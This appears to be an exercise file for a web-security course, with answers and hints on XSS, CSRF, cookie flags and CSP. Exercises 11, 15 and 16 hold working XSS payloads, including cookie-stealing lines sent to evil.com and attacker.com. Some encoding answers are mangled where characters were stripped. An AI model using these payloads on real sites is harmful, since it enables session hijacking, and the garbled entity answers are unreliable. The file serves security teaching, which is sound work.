  Rule 5: Use textContent (not innerHTML) in client-side JS

practice_exercises.title: Exercise 1: Trace an HTTP Request-Response
practice_exercises.description: Given an HTTP request, predict what HTML the server sends back and what the browser displays.
practice_exercises.ai_intro: Understanding how the web works is the foundation for understanding web attacks!
practice_exercises.expected_output:
GET /greet?name=Alice HTTP/1.1 HTML:

Hello, Alice!

Browser displays: Hello, Alice! (as a heading)

hints.message: The browser sends a GET request to the URL path with parameters.
The server takes the 'name' parameter (Alice) and puts it in the HTML.

GET /greet?name=Alice. HTML:

Hello, Alice!

. Browser shows 'Hello, Alice!' as a heading.

practice_exercises.title: Exercise 2: What Are Cookies?
practice_exercises.description: Explain what cookies are and identify the session cookie in a Set-Cookie header.
practice_exercises.ai_intro: Understanding how the web works is the foundation for understanding web attacks!
practice_exercises.expected_output:
1. Three cookies
2. JSESSIONID (session identifier)
3. theme and lang (NOT JSESSIONID because HttpOnly)
4. theme and lang (JSESSIONID has Secure flag)
5. Because it proves who you are - stealing it = account takeover

hints.message: Look at each Set-Cookie header. HttpOnly means JavaScript cannot read it.
Secure means only sent over HTTPS. JSESSIONID has both flags.
3 cookies. JSESSIONID is the session cookie. Only theme and lang are readable by JS (no HttpOnly).

practice_exercises.title: Exercise 3: Identify User Input in HTML
practice_exercises.description: Look at server code and identify where user input appears in the HTML output.
practice_exercises.ai_intro: Understanding how the web works is the foundation for understanding web attacks!
practice_exercises.expected_output:
4 injection points: 1. color -> CSS style attribute 2. name -> HTML body (inside

) 3. msg -> HTML body (inside

) 4. name -> HTML attribute (input value)

hints.message: Look for every place a variable from getParameter() appears in the out.println() calls.
name appears TWICE: once in the heading text and once in the input value attribute.
4 points: color in style, name in h1 text, msg in p text, name in input value. Each is a potential XSS vector.

practice_exercises.title: Exercise 4: HTML Special Characters Quiz
practice_exercises.description: For each character, write its HTML entity equivalent.
practice_exercises.ai_intro: Understanding how the web works is the foundation for understanding web attacks!
practice_exercises.expected_output:
< -> <
> -> >
" -> "
' -> '
& -> &
& must be first because otherwise < would become &lt;
Browser shows text: <script>  Does NOT execute.

hints.message: These are the 5 essential HTML entities for XSS prevention.
& is first because the other entities contain & in them. Encoding & last would double-encode.
< is <, > is >, " is ", ' is ', & is &. <script> shows as text, never executes.

practice_exercises.title: Exercise 5: Predict Browser Behaviour
practice_exercises.description: Given HTML snippets, predict what the browser does with each one.
practice_exercises.ai_intro: Understanding how the web works is the foundation for understanding web attacks!
practice_exercises.expected_output: 1. Displays text 'Hello World' 2. EXECUTES: runs alert(1) - XSS! 3. Displays TEXT '' - SAFE (encoded) 4. EXECUTES: img fails to load, onerror runs alert(1) - XSS! 5. Displays TEXT '' - SAFE (encoded)

hints.message: Real HTML tags execute. HTML entities (< >) are displayed as text.
#2 and #4 have real HTML tags that the browser processes. #3 and #5 use entities.
2: executes (real script tag). 3: safe text (entities). 4: executes (onerror handler). 5: safe text (entities).

practice_exercises.title: Exercise 6: Write an encodeHTML Method
practice_exercises.ai_intro: Every concept here is used by real web developers every day.

hints.message: Start with null check. Then replace & first, then < > " ' in order.
if (input == null) return ""; then chain .replace() calls.
Full method: null check, then replace(&,&), replace(<,<), replace(>,>), replace(","), replace(',')

practice_exercises.title: Exercise 7: Trace Cookie Flow
practice_exercises.ai_intro: Every concept here is used by real web developers every day.
practice_exercises.expected_output:
3. YES (same domain, HTTPS, path matches)
4. NO (Secure flag prevents sending over HTTP)
5. Shows nothing related to JSESSIONID (HttpOnly blocks JS access)

hints.message: The Secure flag means cookie only sent over HTTPS. HttpOnly means no JavaScript access.
Step 4: HTTP (not HTTPS) + Secure flag = cookie NOT sent.
HTTPS: cookie sent. HTTP: cookie NOT sent (Secure flag). document.cookie: no JSESSIONID (HttpOnly).

practice_exercises.title: Exercise 8: Same-Origin Policy Basics
practice_exercises.ai_intro: Every concept here is used by real web developers every day.
practice_exercises.expected_output:
evil.com cannot read bank.com cookies (different origin).
bank.com JS CAN read bank.com cookies (same origin).
evil.com CAN make browser send request to bank.com (CSRF!).
evil.com CANNOT read the response (blocked by Same-Origin Policy).
XSS is dangerous because the script runs IN bank.com's context = same origin.

hints.message: Same-Origin Policy: scripts can only access data from the SAME origin (protocol + domain + port).
A browser CAN send cross-origin requests (that is how CSRF works) but CANNOT read the responses.
XSS bypasses Same-Origin Policy because the injected script runs WITHIN the target's origin.

practice_exercises.title: Exercise 9: HTTP vs HTTPS for Cookies
practice_exercises.ai_intro: Every concept here is used by real web developers every day.
practice_exercises.expected_output:
Yes, attacker can intercept (unencrypted HTTP, packet sniffing).
They can impersonate the user (session hijacking).
With Secure flag: browser does NOT send cookie over HTTP.
Attack blocked.

hints.message: Without Secure, the cookie travels in plaintext over HTTP. Anyone on the network can see it.
On public Wi-Fi, tools like Wireshark can capture unencrypted HTTP traffic.
With Secure flag: browser refuses to send the cookie over HTTP. The attacker sees nothing.

practice_exercises.title: Exercise 10: Spot the Missing Encoding
practice_exercises.ai_intro: Every concept here is used by real web developers every day.
practice_exercises.expected_output:
Missing on: Line 2 (role not encoded), Line 3 (bio not encoded), Line 5 (user not encoded in URL).
Line 2: XSS in HTML body. Line 3: Stored XSS from database. Line 5: XSS in URL attribute.

hints.message: Check each line: is the variable wrapped in encodeHTML() before going into out.println()?
Line 2: role is raw. Line 3: bio from database is raw. Line 5: user in URL is raw.
Lines 2,3,5 are missing encoding. Line 3 is especially dangerous: data from the database can contain stored XSS.

practice_exercises.title: Exercise 11: Craft a Reflected XSS Payload
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output:
1. <script>alert('XSS')</script>
2. <script>new Image().src='http://evil.com?c='+document.cookie</script>
3. <script>window.location='http://evil.com'</script>

hints.message: A basic alert payload uses <script>alert('XSS')</script>.
For cookie theft, use new Image().src with document.cookie in the URL.
1: <script>alert('XSS')</script>. 2: <script>new Image().src='http://evil.com?c='+document.cookie</script>. 3: <script>window.location='http://evil.com'</script>

practice_exercises.title: Exercise 12: Trace Stored XSS Step by Step
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: Step 2: INSERT INTO profiles (bio) VALUES ('I love coding! Step 4: Executes the script Step 5: To evil.com (attacker's server) Step 6: EVERY visitor who views the profile

hints.message: The bio is stored in the database including the <script> tag.
When ANY user views the profile, the server reads the bio and puts it in HTML.
The script executes for EVERY visitor. Stored XSS is a one-to-many attack.

practice_exercises.title: Exercise 13: DOM-Based XSS via innerHTML
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: URL: http://site.com/search?q= innerHTML creates a real img tag with onerror handler. Server does not see it because the payload is processed only in the browser's JS. Fix: use textContent instead of innerHTML

hints.message: innerHTML interprets HTML tags. Anything in the query becomes real HTML.
The URL fragment (#) or query parameter is read by JavaScript, not sent to the server.
Fix: textContent treats everything as plain text, never as HTML.

practice_exercises.title: Exercise 14: XSS Without <script> Tags
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: 1. 2. 4. 5.

hints.message: Many HTML tags have event handlers that can execute JavaScript.
triggers when the image fails to load.
img(onerror), svg(onload), body(onload), input(onfocus+autofocus), details(ontoggle)

practice_exercises.title: Exercise 15: Cookie Theft Payload
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!

hints.message: Use new Image().src to make a silent HTTP request to the attacker's server.
encodeURIComponent ensures special characters in cookies don't break the URL.
Payload: new Image().src='http://attacker.com/steal?c='+encodeURIComponent(document.cookie);

practice_exercises.title: Exercise 16: XSS in HTML Attributes
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: userLink = javascript:alert(document.cookie) HTML: Click here Victim clicks -> JavaScript executes! Alternative: ' onclick='alert(1)' x='

hints.message: The javascript: protocol in href executes JavaScript when clicked.
Alternatively, break out of the attribute with ' and add an event handler.
javascript:alert(document.cookie) or ' onclick='alert(1)' x='

practice_exercises.title: Exercise 17: Bypass a Script Tag Filter
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: Bypass 1: alert(1)ipt> -> Bypass 2: -> unchanged (filter only targets script) Filtering fails because there are infinite bypass techniques. Encoding makes ALL tags harmless.

hints.message: Nested tags: put <script inside another <script so removing the outer one reveals the inner.
Different tags bypass filters that only target <script>.
Encoding converts ALL < to < so NO tag of any kind can form. That's why encoding beats filtering.

practice_exercises.title: Exercise 18: Identify XSS Type
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: 1. REFLECTED, 2. STORED, 3. DOM-BASED, 4. REFLECTED, 5. STORED, 6. DOM-BASED

hints.message: Reflected: payload comes from the request URL. Stored: payload from database. DOM: payload processed by client JS.
If the server stores the malicious data -> stored. If it just reflects it back -> reflected.
1:REFLECTED 2:STORED 3:DOM 4:REFLECTED 5:STORED 6:DOM

practice_exercises.title: Exercise 19: XSS via Event Handlers
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output: 2,3,4 execute without interaction (autofocus, onerror, onload). Others need mouse/click.

hints.message: Event handlers like onerror and onload fire automatically without user action.
autofocus makes the input get focus immediately, triggering onfocus.
Auto-execute: onfocus+autofocus, onerror on broken img, onload on svg. Others need interaction.

practice_exercises.title: Exercise 20: Self-Replicating XSS Concept
practice_exercises.ai_intro: Understanding attacks is the first step to building defences!
practice_exercises.expected_output:
Step 4: Victim A's profile
Step 6: Worm executes in Victim B's browser and copies to Victim B's profile
Step 7: Exponential growth
10 generations at 10 each: 10^10 = 10 billion (theoretical max)

hints.message: The worm reads its own code and writes it to the viewer's profile.
Each infected profile becomes a new source of infection.
Exponential: each victim infects more victims. 10^10 is theoretical, but Samy hit 1 million in 20 hours.

practice_exercises.title: Exercise 21: Encode Output in a Servlet
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.

hints.message: Wrap every variable in encodeHTML() before putting it in out.println().
All three outputs need encoding: name in h1, email in p, name in input value.
encodeHTML(name) and encodeHTML(email) for all three lines.

practice_exercises.title: Exercise 22: Fix a Stored XSS Vulnerability
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
out.println("" + encodeHTML(rs.getString("author")) + ""); out.println("

" + encodeHTML(rs.getString("text")) + "

");

hints.message: Both author and text come from the database and could contain stored XSS.
Wrap both rs.getString() calls in encodeHTML().
encodeHTML(rs.getString("author")) and encodeHTML(rs.getString("text"))

practice_exercises.title: Exercise 23: Fix DOM-Based XSS
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
document.getElementById('output').textContent = 'Results: ' + q;
textContent replaces innerHTML. It treats ALL input as plain text, never HTML.

hints.message: textContent treats everything as text, innerHTML treats it as HTML.
Replace .innerHTML with .textContent
document.getElementById('output').textContent = 'Results: ' + q; Safe because textContent never interprets HTML.

practice_exercises.title: Exercise 24: Write a CSP Header
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src https:; frame-src 'none'; connect-src 'self'

hints.message: script-src 'self' only allows scripts from your domain.
style-src needs 'self' and the Google Fonts URL. img-src https: allows any HTTPS image.
default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src https:; frame-src 'none'; connect-src 'self'

practice_exercises.title: Exercise 25: Context-Specific Encoding
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
Context 1: encodeHTML(input)
Context 2: encodeHTMLAttr(input)
Context 3: encodeJS(input)
Each context needs its own encoding method.

hints.message: HTML body uses encodeHTML. Attributes use encodeHTMLAttr. JavaScript uses encodeJS.
Each context has different dangerous characters. ' is safe in HTML body but dangerous in JS strings.
Body: encodeHTML, Attribute: encodeHTMLAttr, JavaScript: encodeJS. Always match encoding to context.

practice_exercises.title: Exercise 26: Client-Side Sanitisation
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.

hints.message: textContent is the safest way to insert text into the DOM.
To strip tags, use regex: /<[^>]*>/g matches everything between < and >.
safePrint uses textContent. stripTags uses input.replace(/<[^>]*>/g, '').

practice_exercises.title: Exercise 27: Validate Input for a Comment Form
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
Validate author: author.matches("^[a-zA-Z0-9 ]{1,50}$")
Validate comment: comment != null && comment.length() <= 500
Return true only if both pass.

hints.message: Use regex for author name: only letters, numbers, spaces.
Check comment length: must be <= 500 and not null.
author.matches("^[a-zA-Z0-9 ]{1,50}$") and comment.length() <= 500

practice_exercises.title: Exercise 28: Fix XSS in an Attribute
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
Encode: out.println("<div class='" + encodeHTML(userClass) + "'>")
Whitelist: Set<String> valid = Set.of("light","dark","blue"); if (!valid.contains(userClass)) throw error;

hints.message: Encode the attribute value to prevent quote-breaking.
Better yet: whitelist the allowed values.
Encode with encodeHTML AND whitelist with Set.of("light","dark","blue").

practice_exercises.title: Exercise 29: CSP with Nonce for Inline Scripts
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output:
Generate: SecureRandom + Base64 encoding
CSP: 'nonce-' + nonce
Script: <script nonce='...'>
Injected scripts without nonce are BLOCKED by CSP.

hints.message: A nonce is a random value generated per page load.
Only scripts with the matching nonce attribute are allowed to run.
Generate random nonce, include in CSP header and in the script tag's nonce attribute.

practice_exercises.title: Exercise 30: Complete XSS Defence Implementation
practice_exercises.ai_intro: Now you become the defender! These techniques protect millions of users.
practice_exercises.expected_output: Complete servlet with CSP + cookie flags + CSRF + encoding + validation + PreparedStatement + logging.

hints.message: Combine all techniques: CSP header, cookie flags, CSRF tokens, output encoding.
doGet: set headers, generate token, encode output. doPost: validate token, validate input, PreparedStatement.
Full implementation with all 7 defence layers.

practice_exercises.title: Exercise 31: Explain CSRF vs XSS
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
XSS: Injects code into trusted page. Runs in victim's browser on trusted site. Steals cookies/data. Fix: output encoding + CSP.
CSRF: Tricks browser into unwanted request. Runs on attacker's site. Exploits auto-attached cookies. Fix: CSRF tokens + SameSite.
Yes, XSS can steal CSRF tokens, enabling CSRF attacks.

hints.message: XSS injects code INTO the trusted page. CSRF sends requests FROM another page.
XSS steals data. CSRF makes unwanted actions. Both exploit browser trust.
XSS can steal CSRF tokens because the script runs on the same origin and can read form fields.

practice_exercises.title: Exercise 32: Trace a CSRF Attack
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output: 1. Victim loads evil.com. 2. Form submits to email.com/settings. 3. Browser includes JSESSIONID cookie. 4. email.com sees valid session + forward_to=attacker@evil.com. 5. All victim's emails now forward to attacker!

hints.message: The browser adds cookies for email.com to any request going to email.com, regardless of origin.
email.com sees a valid session and a settings change request. It processes it.
All emails now forward to attacker. The victim never intended this.

practice_exercises.title: Exercise 33: Write CSRF Token Generator
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!

hints.message: Use java.security.SecureRandom for cryptographic randomness.
Generate 32 bytes, encode with Base64.getUrlEncoder().
new SecureRandom().nextBytes(bytes); Base64.getUrlEncoder().encodeToString(bytes);

practice_exercises.title: Exercise 34: Embed CSRF Token in Form
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
<form action='/transfer' method='POST'>
<input type='hidden' name='csrf_token' value='aBcDeFgHiJkLmNoPqRsT'>
Amount: <input name='amount'>
<button>Transfer</button>
</form>

hints.message: The CSRF token goes in a hidden input field inside the form.
<input type='hidden' name='csrf_token' value='...'> before other fields.
Complete form with hidden field, amount input, and submit button.

practice_exercises.title: Exercise 35: Validate CSRF Token
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!

hints.message: Get token from session, get token from form parameter, compare them.
If they don't match or either is null, send 403 and return immediately.
After successful validation, remove the token from session (one-time use).

practice_exercises.title: Exercise 36: Set HttpOnly Flag
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
cookie.setHttpOnly(true); resp.addCookie(cookie);
Or: Set-Cookie: JSESSIONID=abc123; HttpOnly
Prevents: XSS cookie theft (document.cookie blocked).
Does NOT prevent: CSRF, XSS page defacement, keylogging.

hints.message: cookie.setHttpOnly(true) prevents JavaScript from reading the cookie.
document.cookie will NOT include JSESSIONID when HttpOnly is set.
HttpOnly blocks cookie theft via XSS but does not prevent XSS itself or CSRF.

practice_exercises.title: Exercise 37: Set Secure and SameSite Flags
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
HttpOnly: XSS cookie theft. Secure: network interception. SameSite: CSRF.

hints.message: Each flag addresses a different attack vector.
HttpOnly=XSS, Secure=MITM, SameSite=CSRF.
All three together: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

practice_exercises.title: Exercise 38: Identify CSRF Vulnerable Pages
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
1:YES 2:NO 3:YES 4:NO 5:YES 6:YES 7:NO 8:YES
Rule: State-changing (POST) requests need CSRF tokens. Read-only (GET) do not.

hints.message: CSRF protection is needed on requests that CHANGE state (create, update, delete).
GET requests should be read-only and safe to repeat, so they don't need CSRF tokens.
All POST/PUT/DELETE requests that change data need CSRF tokens. GET requests do not.

practice_exercises.title: Exercise 39: SameSite Cookie Behaviour
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output:
Scenario 1: Strict=NO, Lax=YES. Scenario 2: Strict=NO, Lax=NO. Scenario 3: Strict=NO, Lax=NO.
Bank: Strict (maximum security). Blog: Lax (allows link navigation).

hints.message: Strict blocks ALL cross-site cookies. Lax allows top-level navigation (clicking links).
Form submissions from other sites are blocked by both Strict and Lax.
Strict: most secure but breaks link navigation. Lax: good balance for most sites.

practice_exercises.title: Exercise 40: Complete Session Security
practice_exercises.ai_intro: CSRF and session attacks target how browsers handle authentication. These defences are essential!
practice_exercises.expected_output: Login: session + cookie flags. Pages: CSRF token + CSP. Forms: validate token. Logout: session.invalidate().

hints.message: Combine session creation, cookie flags, CSRF tokens, and CSP into one system.
Login: create session + flags. Each page: CSRF + CSP. Submit: validate. Logout: invalidate.
Full lifecycle: authenticate -> secure session -> protect pages -> validate forms -> clean logout.

practice_exercises.title: Exercise 41: Find XSS in a Servlet
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: Lines 4,5,6 are all vulnerable. Fix: encodeHTML(user), encodeHTML(page), encodeURL(user)

hints.message: Every req.getParameter() value that goes into out.println() without encoding is XSS.
Line 4: user in heading. Line 5: page in paragraph. Line 6: user in URL.
Fix: encodeHTML(user) in lines 4 and 6, encodeHTML(page) in line 5.

practice_exercises.title: Exercise 42: Find CSRF Vulnerability
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: No CSRF token! Fix: generate token in doGet, embed as hidden field, validate in doPost before transfer.

hints.message: Look for a CSRF token in the form and validation in doPost.
There is no hidden field with a token and no validation.
Add: generate token in doGet, hidden input in form, validate in doPost before calling transfer().

practice_exercises.title: Exercise 43: Fix Cookie Configuration
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: Missing: HttpOnly, Secure, SameSite. Fixed: JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

hints.message: A bare session cookie without flags is vulnerable to XSS, MITM, and CSRF.
HttpOnly, Secure, and SameSite are all missing.
JSESSIONID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/. Each flag protects against a different attack.

practice_exercises.title: Exercise 44: Security Code Review: Blog
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: 1. Stored XSS: title/body/author from DB not encoded. 2. No CSRF token on comment form. 3. No CSP header. 4. No input validation on comment.

hints.message: Data from the database can contain stored XSS if it was not validated on input.
The comment form has no CSRF token. There's no CSP header either.
4 issues: unencoded DB output (stored XSS), no CSRF token, no CSP, no input validation.

practice_exercises.title: Exercise 45: Fix All Vulnerabilities
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: Encode search in both places, add CSP header, set cookie flags.

hints.message: Both uses of 'search' need encodeHTML(). Then add security headers.
CSP: Content-Security-Policy: default-src 'self'; script-src 'self'
Encode both outputs, add CSP header, set cookie flags on session.

practice_exercises.title: Exercise 46: Review Client-Side JS
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: Lines 1,2 vulnerable (innerHTML). Line 3 safe (textContent). Fix: change innerHTML to textContent.

hints.message: innerHTML interprets HTML (dangerous). textContent does not (safe).
Lines 1 and 2 use innerHTML. Line 3 uses textContent.
Change lines 1 and 2 to use textContent instead of innerHTML.

practice_exercises.title: Exercise 47: CSP Misconfiguration
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: unsafe-inline allows ALL inline scripts (defeats XSS protection!). unsafe-eval allows eval(). This CSP does NOT protect against XSS. Better: script-src 'self' (no unsafe directives).

hints.message: 'unsafe-inline' defeats the entire purpose of CSP for XSS prevention.
It allows ANY inline script to run, including injected XSS scripts.
Remove unsafe-inline and unsafe-eval. Use script-src 'self' only, or nonce-based CSP.

practice_exercises.title: Exercise 48: Session Fixation
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: Generate NEW session ID after login: request.getSession().invalidate(); request.getSession(true);

hints.message: Session fixation: attacker sets the session ID BEFORE the victim logs in.
After login, the old session ID (known to attacker) is now authenticated.
Prevention: invalidate old session and create new one on login.

practice_exercises.title: Exercise 49: Complete Security Audit
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: 6+ issues: SQL injection (2x), XSS (2x), no CSRF, no CSP, no cookie flags, no input validation.

hints.message: Check for: SQL injection, XSS, CSRF, cookie flags, CSP, input validation.
String concatenation in SQL = SQLi. String concatenation in HTML = XSS.
SQLi: 2 places. XSS: 2 places. Missing: CSRF, CSP, cookies, validation, PreparedStatement.

practice_exercises.title: Exercise 50: Fix Production Code
practice_exercises.description: Find and fix vulnerabilities in real code.
practice_exercises.ai_intro: Code review is one of the most important skills in security. Practice finding every flaw!
practice_exercises.expected_output: 8+ issues: XSS in title, XSS in h1, XSS in body, SQL injection in q, SQL injection in sort, no CSP, no cookie flags, no input validation, database content not encoded.

hints.message: Count every place user input enters SQL or HTML without protection.
q goes into HTML title, h1, AND SQL query. sort goes into SQL ORDER BY.
8+ fixes: encode q in title/h1, PreparedStatement for q, whitelist for sort, encode DB output, add CSP, cookies, validation.

practice_exercises.title: Exercise 51: MySpace Samy Worm Analysis
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output:
1. Stored XSS
2. MySpace user profiles
3. Self-replicating: copied itself to each viewer's profile
4. Over 1 million
5. a) Output encoding b) CSP c) CSRF tokens on profile updates

hints.message: Samy used stored XSS in MySpace profiles to create a self-spreading worm.
Each infected profile became a new attack vector, creating exponential growth.
Output encoding, CSP, and CSRF tokens would each have blocked part of the attack.

practice_exercises.title: Exercise 52: British Airways Breach
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output:
1. Script injection (likely supply chain or stored XSS)
2. Captured payment card details and sent to attacker's server
3. script-src 'self' (would block external script)
4. 20 million pounds
5. a) CSP b) Subresource Integrity c) Regular security audits

hints.message: The attackers injected a script that captured payment card details during checkout.
CSP with script-src 'self' would have blocked the external malicious script.
CSP, SRI (Subresource Integrity), and regular audits would have prevented or detected this.

practice_exercises.title: Exercise 53: Design a Secure Comment System
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: Validate: max length, strip dangerous chars. Store: raw text. Display: encodeHTML() on output. CSRF: token on form. CSP: script-src 'self'. Cookies: HttpOnly; Secure; SameSite=Lax.

hints.message: Store raw text, encode on output. This way the same data can be safely displayed in different contexts.
CSRF token on comment form prevents attackers from posting comments as the victim.
Complete: validate length, store raw, encode on display, CSRF token, CSP header, secure cookies.

practice_exercises.title: Exercise 54: XSS in a Social Media Profile
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: Display name: XSS in HTML body, fix=encodeHTML. Bio: stored XSS, fix=encodeHTML. Website: javascript: protocol, fix=validate URL scheme (http/https only). Picture: onerror XSS, fix=validate URL + encode in src attribute.

hints.message: Each field has different XSS risks depending on where it appears in HTML.
Website URL is tricky: javascript:alert(1) is a valid URL but executes JS.
Validate URL scheme (must start with http:// or https://), encode all fields, validate picture URL.

practice_exercises.title: Exercise 55: Build a Security Header Checklist
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output:
1. default-src 'self'; script-src 'self'
2. nosniff
3. DENY
4. 0 (disabled, rely on CSP)
5. max-age=31536000; includeSubDomains
6. HttpOnly; Secure; SameSite=Lax
7. strict-origin-when-cross-origin

hints.message: CSP is the most impactful security header for XSS prevention.
X-Content-Type-Options: nosniff prevents MIME type sniffing attacks.
All 7 headers together provide comprehensive protection.

practice_exercises.title: Exercise 56: Incident Response: XSS Detected
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output:
1. Block the malicious comment immediately
2. Check how many users viewed it
3. Invalidate affected sessions
4. Add output encoding to comment display
5. Notify affected users
6. Add CSP, review all output points, add automated XSS scanning

hints.message: First priority: stop the bleeding (remove the malicious content).
Check server logs to see how many users were exposed.
Full response: block, assess, contain, fix, recover, review.

practice_exercises.title: Exercise 57: Design CSRF Protection for E-Commerce
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: All pages with forms need tokens. Generate per-session. Validate before processing. AJAX: send token in custom header (X-CSRF-Token).

hints.message: Every page that changes state (adds to cart, places order) needs CSRF protection.
For AJAX: include the token in a custom HTTP header instead of a form field.
Generate per-session, validate on every POST, include in both forms and AJAX headers.

practice_exercises.title: Exercise 58: Full Stack Security Architecture
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: Each component gets: CSP policy, CSRF on all POST forms, secure cookies, input validation rules, output encoding on all dynamic content.

hints.message: Each component may need different CSP policies (admin needs more restrictions).
All POST forms need CSRF. All output needs encoding. All cookies need flags.
Build a matrix: components x security measures.

practice_exercises.title: Exercise 59: Penetration Testing Plan
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: Test reflected XSS on all input fields, test stored XSS on profiles and messages, test CSRF on all POST endpoints, test cookie flags and session management.

hints.message: Test every input field with standard XSS payloads.
For stored XSS, check profiles, messages, and any shared content.
Test CSRF by submitting forms from an external page without tokens.

practice_exercises.title: Exercise 60: Capstone: Secure Web Application
practice_exercises.description: Apply security knowledge to real-world scenarios.
practice_exercises.ai_intro: These scenarios reflect real challenges security professionals face every day.
practice_exercises.expected_output: Complete architecture with all 7 security layers for each feature.

hints.message: Start with authentication (login/registration), then protect each feature.
Every feature needs all 7 layers of defence.
Complete architecture covering input validation, output encoding, CSRF, sessions, CSP, errors, logging.
